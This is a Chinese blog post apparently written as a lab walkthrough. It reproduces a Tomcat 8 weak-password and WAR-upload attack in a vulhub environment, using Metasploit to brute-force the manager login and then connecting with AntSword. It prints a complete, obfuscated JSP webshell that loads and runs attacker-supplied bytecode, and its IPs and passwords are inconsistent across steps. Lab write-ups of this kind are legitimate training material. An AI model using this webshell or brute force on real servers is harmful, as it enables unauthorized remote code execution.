---
title: 【Tomacat漏洞复现】后台弱口令+文件上传
date: 2025-09-04
categories:
  - Web攻防
  - 靶场
  - 红队
image: images/35.webp
---
# 影响范围
Tomcat8
# 环境搭建
这边就还是用vulhub进行复现
```
cd vulhub-master/tomcat/tomcat8
sudo docker-compose up -d
docker ps

http://192.168.197.140:8080/
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141819.png)
# 漏洞复现
这里使用MSF进行复现：
```
msfconsole
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904141926.png)
**查找与 tomcat 相关的模块**
```
search tomcat
```
**使用 auxiliary/scanner/http/tomcat_mgr_login 模块**
```
use auxiliary/scanner/http/tomcat_mgr_login 
```
**查看需要填写哪些参数**
```
show options
```
**将 rhosts 设置为目标机**
```
set rhosts 172.16.2.174
```
**进行爆破**
```
run
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904142741.png)
这里成功爆破出账号/密码：
```
[+] 192.168.197.140:8080 - Login Successful: tomcat:tomcat
```
**点击 Manager App 进行登录**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155742.png)
**登录后找到上传点**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904155816.png)
将带有一句话的111.jsp文件压缩成zip，并且将压缩后的zip文件改名为111.war
 jsp 一句话木马，密码为123
```
<%  String H9991 = request.getParameter("123");if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = "";for (int i = 0; i < aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %>
```
**上传111.war文件**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160012.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904160033.png)
访问 172.16.2.174:8080/11/11.jsp，无任何回显。（这里我的码错了，方法都是一样的，我又重新上传了一下）
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161029.png)

**上蚁剑**
```
http://192.168.197.140:8080/11/11.jsp
密码：pass
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904161012.png)
